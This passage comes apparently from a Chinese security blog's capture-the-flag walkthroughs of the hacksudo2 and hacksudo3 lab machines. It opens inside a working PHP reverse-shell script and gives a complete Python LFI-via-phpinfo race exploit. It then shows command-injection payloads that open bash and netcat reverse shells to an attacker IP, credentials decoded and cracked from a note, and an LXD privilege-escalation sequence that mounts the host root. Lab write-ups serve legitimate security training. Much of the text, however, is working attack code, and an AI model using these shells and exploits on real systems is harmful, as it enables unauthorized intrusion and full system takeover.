&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	$daemon = 1;</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Change to a safe directory</span></span><br><span class="line"><span class="string">chdir("/");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Remove any umask we inherited</span></span><br><span class="line"><span class="string">umask(0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string">// Do the reverse shell...</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Open reverse connection</span></span><br><span class="line"><span class="string">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span></span><br><span class="line"><span class="string">if (!$sock) &#123;</span></span><br><span class="line"><span class="string">	printit("$errstr ($errno)");</span></span><br><span class="line"><span class="string">	exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Spawn shell process</span></span><br><span class="line"><span class="string">$descriptorspec = array(</span></span><br><span class="line"><span class="string">   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from</span></span><br><span class="line"><span class="string">   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to</span></span><br><span class="line"><span class="string">   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$process = proc_open($shell, $descriptorspec, $pipes);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!is_resource($process)) &#123;</span></span><br><span class="line"><span class="string">	printit("ERROR: Can't spawn shell");</span></span><br><span class="line"><span class="string">	exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Set everything to non-blocking</span></span><br><span class="line"><span class="string">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit("Successfully opened reverse shell to $ip:$port");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">	// Check for end of TCP connection</span></span><br><span class="line"><span class="string">	if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Shell connection terminated");</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Check for end of STDOUT</span></span><br><span class="line"><span class="string">	if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">		printit("ERROR: Shell process terminated");</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">	// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">	$read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">	// data to process's STDIN</span></span><br><span class="line"><span class="string">	if (in_array($sock, $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("SOCK READ");</span></span><br><span class="line"><span class="string">		$input = fread($sock, $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("SOCK: $input");</span></span><br><span class="line"><span class="string">		fwrite($pipes[0], $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the process's STDOUT</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDOUT READ");</span></span><br><span class="line"><span class="string">		$input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDOUT: $input");</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the process's STDERR</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[2], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDERR READ");</span></span><br><span class="line"><span class="string">		$input = fread($pipes[2], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit("STDERR: $input");</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fclose($sock);</span></span><br><span class="line"><span class="string">fclose($pipes[0]);</span></span><br><span class="line"><span class="string">fclose($pipes[1]);</span></span><br><span class="line"><span class="string">fclose($pipes[2]);</span></span><br><span class="line"><span class="string">proc_close($process);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="string">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="string">function printit ($string) &#123;</span></span><br><span class="line"><span class="string">	if (!$daemon) &#123;</span></span><br><span class="line"><span class="string">		print "$string\n";</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /info.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /file.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&gt;"</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    print(<span class="string">"\nGot it! Shell created in /tmp/g"</span>)</span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i))</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"LFI With PHPInfo()"</span>)</span><br><span class="line">    print(<span class="string">"-="</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Getting initial offset..."</span>, end=<span class="string">' '</span>)</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Spawning worker pool (%d)..."</span> % poolsz)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print()</span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            print(<span class="string">"Woot!  \m/"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">":("</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\nTelling threads to shutdown..."</span>)</span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Shuttin' down..."</span>)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"Don't forget to modify the LFI URL"</span>)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<ul>
<li>发现报错</li>
</ul>
<p><img data-src="./hacksudo2/7.png" alt></p>
<ul>
<li>设置<code>burp</code>流量转发，观察请求具体信息</li>
</ul>
<p><img data-src="./hacksudo2/8.png" alt></p>
<p><img data-src="./hacksudo2/9.png" alt></p>
<p><img data-src="./hacksudo2/10.png" alt></p>
<ul>
<li>修改脚本</li>
</ul>
<p><img data-src="./hacksudo2/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python payload_shell.py 192.168.43.166 80 100</span><br></pre></td></tr></table></figure>

<ul>
<li>反弹<code>shell</code></li>
</ul>
<p><img data-src="./hacksudo2/12.png" alt></p>
<h3 id="提权-amp-amp-FLAG"><a href="#提权-amp-amp-FLAG" class="headerlink" title="提权&amp;&amp;FLAG"></a>提权&amp;&amp;FLAG</h3><ul>
<li><code>NFS</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -t nfs 192.168.43.166:/mnt/nfs tmp/pe</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo2/13.png" alt></p>
<ul>
<li>提权 <code>bash -p</code></li>
</ul>
<p><img data-src="./hacksudo2/14.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hacksudo</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo3</title>
    <url>/2021/04/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo3/</url>
    <content><![CDATA[<h1 id="hacksudo3"><a href="#hacksudo3" class="headerlink" title="hacksudo3"></a>hacksudo3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hacksudo3</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/log# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.141   08:00:27:b3:dc:c3       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.160   68:07:15:e5:9f:39       Intel Corporate</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">7 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.943 seconds (131.76 hosts/sec). 7 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.141</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/var/log# nmap -sV -A -p 1-65535 192.168.4.141</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-23 04:49 EDT</span><br><span class="line">Nmap scan report for hacksudo.lan (192.168.4.141)</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: Link Lock - Password-protect links</span><br><span class="line">MAC Address: 08:00:27:B3:DC:C3 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/23%OT=80%CT=1%CU=30567%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=60828A16%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=106%TI=Z%CI=Z%II=I%</span><br><span class="line">OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5</span><br><span class="line">OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=</span><br><span class="line">OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%</span><br><span class="line">OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0</span><br><span class="line">OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S</span><br><span class="line">OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R</span><br><span class="line">OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N</span><br><span class="line">OS:%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.61 ms hacksudo.lan (192.168.4.141)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hacksudo3/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.141/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/23 04:55:35 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/login.php (Status: 200)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/info.php (Status: 200)</span><br><span class="line">/create (Status: 301)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/generator.php (Status: 200)</span><br><span class="line">/hidden (Status: 301)</span><br><span class="line">/decrypt (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/bruteforce (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/23 04:58:44 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hacksudo3/2.png" alt></p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><a href="http://192.168.4.141/generator.php" target="_blank" rel="noopener">http://192.168.4.141/generator.php</a></p>
<p><img data-src="./hacksudo3/3.png" alt></p>
<p><img data-src="./hacksudo3/4.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`id`</span><br><span class="line"><span class="meta">#</span><span class="bash"> fail</span></span><br><span class="line">`/bin/bash -i &gt;&amp; /dev/tcp/192.168.4.40/7777 0&gt;&amp;1`</span><br><span class="line">`nc -e /bin/bash 192.168.4.40 7777`</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> successful</span></span><br><span class="line">`/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.4.40/7777 0&gt;&amp;1'`</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo3/5.png" alt></p>
<h3 id="提权-amp-amp-FLAG"><a href="#提权-amp-amp-FLAG" class="headerlink" title="提权&amp;&amp;FLAG"></a>提权&amp;&amp;FLAG</h3><ul>
<li>敏感信息文件</li>
</ul>
<p><img data-src="./hacksudo3/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat hacksudo</span><br><span class="line">unpxfhqb ybpxre FFU hfreanzr:unpxfhqb cnffjbeq:63p9142792q571q0s7p28ro30626q6s38792n2r7679o76q784231676q62447so80ns8953745s709p6622qqn2po4q754p262q0q31o3030n08s7o524079n6o336o</span><br></pre></td></tr></table></figure>

<ul>
<li>破解</li>
</ul>
<p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a></p>
<p><img data-src="./hacksudo3/7.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hacksudo locker SSH username:hacksudo password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a><br><img data-src="./hacksudo3/8.png" alt></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hacksudo / vishal</span><br></pre></td></tr></table></figure>

<p>备注：这里直接<code>ssh</code>是不可以的，需要<code>www-data</code> <code>su</code>指令切过去</p>
<ul>
<li><code>lxd</code>提权</li>
</ul>
<p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p>
<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> build a simple alpine image</span></span><br><span class="line">git clone https://github.com/saghul/lxd-alpine-builder</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine</span><br><span class="line">sudo ./build-alpine</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo3/9.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali</span></span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vuln</span></span><br><span class="line">wget http://192.168.4.40/alpine-v3.8-x86_64-20210423_0835.tar.gz</span><br><span class="line"></span><br><span class="line">lxc image import ./alpine-v3.8-x86_64-20210423_0835.tar.gz --alias myimage</span><br><span class="line">lxd init</span><br><span class="line">lxc init myimage ignite -c security.privileged=true</span><br><span class="line">lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite /bin/sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo3/10.png" alt></p>
